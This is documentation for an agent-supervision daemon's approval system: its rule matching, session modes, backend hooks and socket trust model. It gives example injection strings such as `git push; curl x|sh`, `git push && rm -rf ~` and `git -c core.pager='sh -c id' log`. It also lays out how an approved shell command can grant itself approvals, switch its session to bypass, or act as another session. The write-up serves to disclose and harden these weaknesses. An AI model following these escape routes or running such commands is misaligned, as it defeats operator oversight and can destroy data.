# Approvals

## Tool calls that answer to a policy, and to you

A session's tool calls are decided before they run. A rule
reads `allow Read`, `ask Bash(git push*)` or `deny Write(/etc/*)`, the strictest
match wins, and an agent's own `APPROVALS` file can only tighten what the daemon
set, never widen it.

In an `allow` rule on a shell command, `*` and `?` never cover a shell operator
(`; & | ` $ < > ( )`) or a line break, so `allow Bash(git push*)` passes
`git push origin feat/x` but not `git push && rm -rf ~`, `git push; curl x|sh`
or `git push $(id)`. An operator written out in the rule matches literally:
`allow Bash(make build && make test)` covers exactly that command. `deny` and
`ask` rules keep their wildcards unrestricted, so `deny Bash(rm -rf /*)` also
blocks `rm -rf /x; ls`.

That restriction closes shell operators only. It does not stop a program that an
argument runs: `allow Bash(git *)` still passes `git -c core.pager='sh -c id' log`,
and `allow Bash(find *)` still passes `find . -exec id {} +`. The same holds for
`sh -c`, `bash -c`, `npm run`, `make`, and `xargs`. For those, write a targeted
deny, which has no operator restriction and wins over any allow:
`deny Bash(git -c*)` refuses the `-c` form while `allow Bash(git *)` keeps
passing the other git calls.

On `ask` the question goes to the session's own gateways as a menu of four
answers, and the tool call waits. The four are:

- `allow`: this call runs, and the next identical one asks again.
- `allow --session`: this call runs, and the same call passes for the rest of
  the session. The grant lives with the session and ends when it stops.
- `allow --always`: this call runs, and a rule is written the way `approve rule`
  writes one, so it keeps passing after restarts. The rule names the exact
  subject as it ran (`Bash(git push origin feat/x)` for a shell command), and
  the menu shows the rule before you press it. A subject holding a wildcard, a
  shell operator or a line break gets no rule, and the operator is told so.
- `deny`, optionally with `--reason`: the call is refused, and the reason is
  what the agent reads in its refusal.

Nobody answering within the approval wait, 5 minutes by default, is a refusal,
said to the model in words it can act on. The gateways are told the deadline,
so a menu can show when the question expires.

A session is `ask`, `accept-edits`, `plan`, `auto` (everything passes except what a
deny rule refuses, the hook stays installed), `strict` (everything a rule does not
name is asked about too), `smart`, or `bypass` (no hook at all).

`smart` lets a model rate each call that no rule settles, except reads (`Read`,
`Glob`, `Grep`, `LS`), which pass as before. A `low` rating passes the call,
`medium` and `high` ask you as `ask` does. The rating is kept for the session,
so the same subject is not rated twice. The model is the first installed
LLM backend, the one the memory extractor uses, and `HERRSCHER_CURATION_MODEL`
overrides its model. Without any LLM backend, or when
the rating fails, smart decides as `ask` does and says so to the operator: a call
no rule names runs unasked, a call a rule asks about is put to you. Smart costs
one model call per distinct unmatched subject.

How it is wired in depends on the backend, and each backend says for itself what
it can enforce. Claude Code gets a `PreToolUse` hook materialized into the
session's worktree, with or without an agent: a session created without `--agent`
now gets one written into `.claude/settings.local.json`, which is local to the
worktree and never touches a tracked settings file. Codex is asked over the
app-server, which requests an approval per command and per patch, so the same
rules bite there. Grok Build gets the same hook command in
`.grok/hooks/herrscher-approve.json`, written beside the Claude one with
`failClosed`, because Grok lets a call run when a hook times out or crashes. The
Grok backend runs its CLI with folder trust off, so that project hook loads in a
headless run, and the hook asks about Grok's tools under their Claude names
(`run_terminal_command` is `Bash`; `read_file` and `hashline_read` are `Read`;
`search_replace` and `hashline_edit` are `Edit`; `write` is `Write`; `grep` and
`hashline_grep` are `Grep`; `list_dir` is `LS`; `todo_write` is `TodoWrite`;
`spawn_subagent` is `Task`; `web_fetch` is `WebFetch`; `web_search` is
`WebSearch`), so one set of rules covers both. Any other Grok tool keeps its own
name, which no Claude rule names. Before each turn of a gated session the Grok
backend checks with `grok inspect` that Grok loads that hook, enabled, for the
worktree, and refuses the turn when it does not, rather than run it ungated. Cursor declares that it enforces
nothing, because `cursor-agent` exposes no hook and no approval channel.
Antigravity declares the same: `agy` runs headless with every tool call
approved, since a permission prompt in a headless turn would block it.

That last one is the shape of every limit here: a mode that will not bite is said
out loud at create time rather than discovered on the first tool call nobody was
asked about. A shared session (no isolated worktree), a remote session without an
agent (no channel to materialize a hook through), a backend that cannot enforce,
and a daemon that cannot tell what its backends do all produce a warning naming
the session and the reason. The session is still created, and it still records
the mode: what is refused is the silence, not the session. `session switch` says
the same thing when it moves a gated session onto a backend that cannot enforce
its mode.

The hook binds the agent herrscher started and nothing else on the machine, which
is both its guarantee and the whole of its reach.

When no daemon answers, the approve CLI verbs run locally, since they are not
daemon-only (`core/host/operator.go`). `approve ask` is the exception: it is
daemon-only and fails without one. The approval hook never falls back: when it
cannot reach a daemon, it denies the tool call and says why
(`core/host/approve_hook.go`, `refuseHook`).

`approve list`, `approve allow <id> [--session | --always]`,
`approve deny <id> [--reason '…']`, `approve rule`, `approve ask` and
`approve mode` (`ask`, `accept-edits`, `plan`, `auto`, `bypass`, `strict` or
`smart`) are the verbs this section covers.
Flags come after the id or before it: `approve allow --session <id>` works too.
With no rule configured nothing is ever asked, which is exactly how herrscher
behaved before this existed.

## Who may change the approvals

`approve allow`, `approve deny`, `approve rule` and `approve mode` go to the
command socket the CLI resolves. That is the one named by `HERRSCHER_COMMAND_SOCKET`
when the variable is set, and the operator's socket otherwise
(`core/host/cmdsocket_remote.go`). With the variable set, they reach the session's
own socket, where the agent role refuses them. Without it, they reach the
operator's socket, where they run as `owner`. The `role` verbs follow the same
path. The operator's socket asks for no second proof: a process running under the
daemon's user account is the operator, as far as the daemon can tell.

That is the trust model, and it has a consequence. A shell command the approval
hook allowed runs with the operator's rights. It can unset
`HERRSCHER_COMMAND_SOCKET`, or dial the operator's socket directly, and then
grant itself an approval or switch its session to `bypass`, which removes the
hook. The variable is not needed on every path. `herrscher -p "<text>"` opens
its session in a window while a daemon runs: that window sends the
`session create` to the operator's socket as `owner`, whatever the variable says
(`runPromptWindow`, `serve.go:358-366`, through `DaemonDispatch`,
`core/host/daemonclient.go:82-89`). With `--print`, or without a window, the
same command goes through the command registry and honours the variable
(`runPrompt`, `serve.go:337-351`, and `forwardDaemonOwnedCommands`,
`core/host/operator.go:36`, which reads the variable). Without the variable, any
`herrscher` subcommand on sessions, approvals, hosts or roles reaches the
operator's socket as `owner` while a daemon runs, `herrscher approve allow <id>`
included (`forwardDaemonOwnedCommands`, `core/host/operator.go:36`, through
`commandSocketTarget`, `core/host/cmdsocket_remote.go:14-19`). The hook sees a
command string, not what the command does, so it cannot tell those calls from
any other.

Session sockets are not protected either. Each session's command socket path
follows from its name (`core/host/cmdsocket_unix.go`), and `session list`, which
an agent may run, shows every name. Any process of the same user can connect to
any session's socket, and the daemon serves that connection with the rights of
the session that owns the socket, not the caller's. A shell of any session can
therefore send a message or seed a session as session B. Those rights reach B
itself and the sessions B delegated for every verb that names a session; the
verbs that name none, such as `session info`
(`core/host/session_cmd.go:144-151`) and `session list`
(`core/internal/manager/session_query.go:88`), show every session. The check
runs in `subjectOf` (`core/host/authz.go:149-165`) over the verbs of
`sessionArgs` (`core/host/authz.go:57-90`), through `inSubtree`
(`core/host/authz.go:167-192`), and `Decide` enforces it
(`core/internal/authz/authz.go:137`). The daemon checks no credential on a
session socket except the token that `approve ask` requires, and only for that
verb.

What #232 protects is narrower. Each session holds its own token, sent in
`HERRSCHER_SESSION_TOKEN` and checked in constant time. `approve ask` answers only
for the session whose token it carries, so a session cannot answer an approval for
another session without that token, and cannot guess it. On Linux, though, a
process of the same user can read a session's token from that session's
environment, so the token is no barrier against an approved command either. The
hook fails closed: a missing session name, a missing token, no daemon, an answer
that is neither `allow` nor `deny`, or a payload over the size limit each refuse
the tool call.

When the backend sets `HERRSCHER_APPROVAL_SOCKET`, the hook asks on that socket
instead, and sends neither the session name nor the token: the socket carries no
credential, and the daemon answers through the asker the turn carries. The hook
never falls back to the command socket when that socket fails, so an error there
refuses the call with its cause.

For the operator, the rule is this: never grant a broad rule on `Bash`. A rule
that lets a shell run a program able to reach a socket gives that program the
operator's rights. Examples of such programs are `sh`, `bash`, `python`, `node`,
`env`, `xargs`, `find -exec`, `git -c`, `make`, `awk`, `perl`, `go test -exec`,
the tools that speak to a socket directly (`socat`, `nc -U`), and the wrappers
that run an argument vector (`timeout`, `nice`, `nohup`, `setsid`, `stdbuf`). So
`allow Bash(*)`, `allow Bash(git *)` and `allow Bash(herrscher*)` are all broad
rules. The last is the most direct: `herrscher approve allow <id>` reaches the
operator's socket through the path above.

Keep `ask` on everything that runs code from the repository: `make`, `go test`,
`npm run`, and any script. A session in `acceptEdits` mode can write a Makefile
recipe or a test file without asking, then run the command a rule names. An exact
rule does not protect you against that, because a rule matches the command text,
not the code the command executes.

A real boundary needs one of two things, and herrscher has neither today. Either
approval changes are confirmed out of band, on a channel the session cannot write
to, such as the gateway or the TUI answered by you, so a shell call cannot
complete one alone. Or the sessions run under another user account, or in a
sandbox that hides the runtime directory, the operator's socket and the session
sockets, so the shell cannot reach them at all. Until one of these exists, the
approval system guards against the model's mistakes and against rules you wrote.
It does not guard against a command you approved.

## A daemon that knows who is calling

Identity comes from the entry point, never from the message.

A session talks to its own command socket, which carries that session's rights
only, so through it a session cannot widen the policy that decides its own tool
calls. Who connects is a separate matter: any process of the same user can dial
any session's socket, as described under who may change the approvals above. A
session cannot open a session through its own socket either. Through the
operator's socket it can: run from a shell without `HERRSCHER_COMMAND_SOCKET`,
`herrscher -p` or `herrscher session create` creates a session that carries
whatever flags the command line chose, and one with no agent or `--approvals
bypass` is a second session where the caller's own policy does not apply.
Delegation is untouched, because a `⟢ delegate:` trailer opens a worker that
runs a registered agent and answers to a policy the way its lead does.

That much applies from the upgrade, with nothing to configure.

For humans, nothing changes while nobody holds a role. Each gateway keeps its own
rules and herrscher decides nothing. `role grant <principal> <owner|operator|observer>`
hands the decision to the core, and says so plainly the first time, because from
then on every gateway account without a role is `observer`. `role list`,
`role show` and `role revoke` are the rest of the surface.

Locally this is a guardrail rather than a wall: the agent and the daemon run
under one account, so nothing stops a determined agent from looking for the
operator's socket in the same directory. The real boundary is a session on a
host, under a restricted account, where ssh forwards that session's socket and no
other.

What the agent's shell can read is narrower than what the daemon holds. Every key
a gateway's manifest declares (`DISCORD_BOT_TOKEN` and the rest) is read once,
kept inside the daemon, and removed from the process environment, at startup and
again on every `--env-file` load. So `env` in a session shows nothing of it, and
no vendor CLI a session spawns inherits it. The gateways still build from those
values and your `.env` is untouched: what changes is who gets to read it. Keys no
gateway declares, your `ANTHROPIC_API_KEY` among them, stay where they are,
because the agent needs them to run at all.


## An agent that knows what it is running inside

Every turn's prompt carries a `<capabilities>` block: that this session is
supervised by a running daemon, that the daemon is reachable from its own shell
as `herrscher <verb>` with the credentials it already holds, and the list of
verbs *that session* may run, one line per family.

The list comes from the daemon's registry at spawn, over the environment beside
the gateway credentials, because a gateway's contributed verbs exist only where
that gateway is instantiated. So the block cannot advertise less than the daemon
actually answers.

It is filtered to what the daemon will accept from a session, for a reason worth
stating: a model told it can run `approve rule` and then refused does not read
the refusal as an answer, it reads it as a fault to work around.

Without the block, an agent asked to read a chat channel reaches for a token of
its own and concludes the platform is unreachable, while the daemon behind it
holds that gateway open.

## An agent that knows who it is working for

Every turn's prompt also carries a `<user>` block: the name, commit email and
GitHub handle that git on this machine already holds, read with `git config --get`
from the session's worktree. A per-repository identity is honoured exactly as it
would be on a commit, and nothing has to be configured twice.

There is no setting for it and no file to fill in. An operator who has told git
who they are has told herrscher. A machine where git says nothing adds no block
at all rather than a placeholder, and git is never asked more than once per
session.

The block says in its own words that it is what a commit here would be signed
with and not a proof of identity, because the value comes from a file anyone with
the checkout can edit.

`herrscher whoami` prints what was resolved and which git key each part came
from, and answers without a daemon, because a diagnostic must not sit behind the
thing it is used to diagnose.

